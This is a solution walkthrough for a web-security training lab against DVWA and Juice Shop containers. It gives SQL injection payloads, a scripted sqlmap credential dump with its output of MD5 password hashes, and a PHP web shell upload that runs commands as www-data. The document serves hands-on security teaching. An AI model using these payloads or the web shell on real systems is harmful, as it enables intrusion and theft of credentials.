# 02-web — Solution walkthrough

All commands below run from inside the attacker box (`./lab shell`), which
sits at `172.28.0.5` on the lab's private `172.28.0.0/24` network. DVWA is
at `172.28.0.20` (host `:8080`), Juice Shop at `172.28.0.21` (internally on
port `3000`, host `:3000`).

## 0. First-time DB init (DVWA)

DVWA ships with no database until you submit the setup form once. From a
browser: `http://localhost:8080/setup.php` -> **Create / Reset Database**.
(This also has to be re-run after every `./lab reset 02-web`, since the
DVWA container — and its in-container DB — is recreated from scratch.)

## 1. Manual SQL injection (DVWA Security = Low)

Log in at `http://localhost:8080` as `admin` / `password`, set **DVWA
Security** to **Low**, then open the SQL Injection page and try, in the
`id` field:

```bash
# Manual SQLi (DVWA Security = Low), in the id field:
1' OR '1'='1' -- -
# Extract users with a UNION:
1' UNION SELECT user, password FROM users -- -
```

**Why this works:** at Security = Low, DVWA concatenates the `id`
parameter directly into the SQL query with no escaping or parameterization.
`' OR '1'='1' -- -` closes the string literal early, adds a condition that
is always true, and comments out the rest of the original query — turning
a lookup for one user into a dump of every row the query would otherwise
have filtered out. The second payload is a classic UNION-based injection:
the page originally selects two columns (`first_name`, `last_name`), so a
`UNION SELECT` with two columns of our choosing (`user`, `password`) rides
along in the same result set and gets rendered by the page exactly like
the "real" columns would be — as long as the column *count* and *types*
line up, which is why UNION injection always starts with figuring out how
many columns the original query returns.

## 2. Automated extraction with sqlmap

```bash
# Automated, from the attacker box (cookie from your logged-in browser session):
sqlmap -u "http://172.28.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<yours>; security=low" --batch --dump -D dvwa -T users
```

Grab `<yours>` from the browser's dev tools (Application/Storage -> Cookies)
after logging in and setting Security = Low, or reproduce the same session
from the attacker box with curl:

```bash
rm -f /tmp/dv.txt
curl -s -c /tmp/dv.txt 'http://172.28.0.20/login.php' >/dev/null
TOKEN=$(curl -s -b /tmp/dv.txt 'http://172.28.0.20/login.php' \
  | grep -oP "user_token' value='\K[0-9a-f]+")
curl -s -b /tmp/dv.txt -c /tmp/dv.txt \
  --data "username=admin&password=password&user_token=$TOKEN&Login=Login" \
  'http://172.28.0.20/login.php' >/dev/null
curl -s -b /tmp/dv.txt -c /tmp/dv.txt \
  'http://172.28.0.20/security.php' --data 'security=low&seclev_submit=Submit' >/dev/null
COOKIE="$(grep -oP 'PHPSESSID\s+\K\S+' /tmp/dv.txt | tail -1 \
  | sed 's/^/PHPSESSID=/'); security=low"

sqlmap -u "http://172.28.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="$COOKIE" --batch --dump -D dvwa -T users --threads 4
```

**Why this works:** sqlmap needs an authenticated session because the SQLi
page itself sits behind DVWA's login, and it needs the `security=low`
cookie because DVWA's own application code — not the database — decides
which of its three vulnerability implementations (low/medium/high) runs
for a given request. Once it has a valid, low-security session, sqlmap
fuzzes the `id` parameter, confirms it's injectable (boolean-based,
error-based, UNION-based, and time-based techniques all fire against this
endpoint), and then uses the UNION technique to enumerate and dump the
`users` table directly — no manual payload-crafting required. This was
verified end-to-end against this scenario and reliably produced:

```
Database: dvwa
Table: users
[5 entries]
+---------+---------+-----------------------------+----------------------------------+-----------+------------+
| user_id | user    | avatar                      | password                         | last_name | first_name |
+---------+---------+-----------------------------+----------------------------------+-----------+------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
+---------+---------+-----------------------------+----------------------------------+-----------+------------+
```

(Those hashes are unsalted MD5 — `5f4dcc3b5aa765d61d8327deb882cf99` is
`password`, a well-known example of why unsalted, fast hashes are unsafe
for storing credentials.)

## 3. File-upload web shell

On the DVWA **Upload** page (`Security = Low`), upload a one-line PHP file:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Submit it through the upload form (field name `uploaded`), then trigger it:

```bash
# File-upload web shell (DVWA Upload page), then trigger:
curl "http://172.28.0.20/hackable/uploads/shell.php?cmd=id"
```

**Why this works:** at Security = Low, DVWA's upload page performs no
server-side validation of file type, extension, or content — it accepts
any file and saves it verbatim under `/hackable/uploads/`, a directory the
web server will happily execute PHP from. Because the uploaded file is
valid PHP, requesting it directly runs `system($_GET["cmd"])` in the
context of the web server process, giving arbitrary command execution as
`www-data` on every request — `?cmd=id` above returned
`uid=33(www-data) gid=33(www-data) groups=33(www-data)` when verified
against this scenario.

## 4. OWASP Juice Shop

Open `http://localhost:3000` and work challenges from the hint menu (the
lightbulb icon) or blind. Track solved challenges at
`http://localhost:3000/#/score-board`. A few beginner-friendly ones to aim
for: find a hidden score board link before it's advertised, log in as an
admin account via SQL injection on the login form, and view another
user's shopping basket by tampering with the basket ID in the URL — each
demonstrates a different class of the same root issue: the client is not
trusted to enforce access control or input validity, the server has to.

## Flags / checkpoint

No single flag string — the checkpoint is being able to display the DVWA
`users` table (usernames + password hashes), demonstrated above.
